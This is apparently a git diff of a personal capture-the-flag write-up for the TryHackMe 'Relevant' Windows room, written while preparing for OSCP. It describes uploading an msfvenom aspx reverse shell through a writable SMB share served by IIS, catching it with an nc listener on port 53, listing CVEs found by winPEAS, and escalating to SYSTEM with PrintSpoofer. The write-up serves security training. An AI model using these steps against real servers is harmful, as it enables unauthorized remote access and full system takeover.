@@ -1,12 +1,12 @@
 ---
 title: Relevant
-draft: true
+draft: false
 tags:
   - thm
   - oscp
   - medium
 ---
-This room starts of suggesting to treat this as an actual pentest, stating there are multiple exploitable vulnerabilities. This machine also will not REQUIRE metasploit, which is great as I prep for OSCP which only allows metasploit on 1 machine.
+This room starts of suggesting to treat this as an actual pentest, stating there are multiple exploitable vulnerabilities. This machine also will not REQUIRE metasploit, which is great as I prep for OSCP which only allows metasploit on 1 machine. The IP address of my box changes throughout this, since I had to stop and come back.
 
 
 # Initial Port Scan
@@ -134,14 +134,92 @@ Host script results:
 |_    Current user access: READ/WRITE
 ```
 
-Bob has read/write access to the share that was anonymously readable. We may likely be able to upload a payload and execute it. Bill's access was not much different.
-
-Instead of nmap scans, lets see what crackmapexec gets us for this machine on SMB.
-
-
-
+Bob has read/write access to the share that was anonymously readable. We may likely be able to upload a payload and execute it. Bill's access was not much different. If we can upload files to this location, maybe there's a way to execute them.
 
 ## HTTP
 Lets open our web browser and just view the webpages. There port 80 and port 49663.
 
-Both ports just open up the default IIS landing page.
+Both ports just open up the default IIS landing page. Something I have seen in previous boxes is that a share on the box is linked to the web directory. Lets test if we can get the passwords.txt from the webpage.
+
+And wouldn't you know it...
+![[Pasted image 20240709143914.png]]
+
+We get access to the site this way. Who needs gobuster! I tried each web port and with or without the directory before this combination finally worked.
+
+# Initial Foothold
+
+Now, the plan is to get some kind of shell, utilizing this. 
+I will use msfvenom to craft a payload to use.
+### Notice
+I wound up looking into the write-up from the room designer. I could NOT get a shell to work, either .exe, .asp, .aspx... Until finally I look at the writeup and find they use `windows/shell_reverse_tcp` with `LPORT=53` and use `aspx` for he file format. This payload eventually worked after attempting it a few times.
+
+Used `nc -lvnp 53` to receive the reverse shell.
+
+Once on, I find the share location, and navigate to it. Then, use smb to upload winpeas and find some goodies.
+
+```
+Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+ [*] OS Version: 1607 (14393)
+ [*] Enumerating installed KBs...
+ [!] CVE-2019-0836 : VULNERABLE
+  [>] https://exploit-db.com/exploits/46718
+  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/
+
+ [!] CVE-2019-1064 : VULNERABLE
+  [>] https://www.rythmstick.net/posts/cve-2019-1064/
+
+ [!] CVE-2019-1130 : VULNERABLE
+  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear
+
+ [!] CVE-2019-1315 : VULNERABLE
+  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html
+
+ [!] CVE-2019-1388 : VULNERABLE
+  [>] https://github.com/jas502n/CVE-2019-1388
+
+ [!] CVE-2019-1405 : VULNERABLE
+  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                            
+  [>] https://github.com/apt69/COMahawk
+
+ [!] CVE-2020-0668 : VULNERABLE
+  [>] https://github.com/itm4n/SysTracingPoc
+
+ [!] CVE-2020-0683 : VULNERABLE
+  [>] https://github.com/padovah4ck/CVE-2020-0683
+  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1
+
+ [!] CVE-2020-1013 : VULNERABLE
+  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
+
+ [*] Finished. Found 9 potential vulnerabilities.
+```
+
+Once that is ran, I navigated to `C:\Users\Bob\Desktop\` to grab the user flag.
+
+# Privilege Escalation
+
+I also spied from the write-up that there's a printspoofer tool that can be used to abuse SeImpersonatePrivilege being set for a user.
+
+Find the binary on github and upload it through our trusty share. Then run it.
+
+```
+c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
+PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+This is specifically exploitable due to having SeImpersonatePrivilege.
+
+Once this is done, simply navigate to `C:\Users\Administrator\Desktop` and grab the flag there.
+
+![[Pasted image 20240709162123.png]]
+
+Not my proudest achievement seeing the answer. However, I just did not understand why the reverse shells weren't sticking. Even trying to upload an exe and use a webshell to run that exe was failing. Perhaps that would have worked with port 53? Googling how to exploit SeImpersonatePrivilege could have also led me down the path to how to exploit the box. Definitely a learning experience for sure.
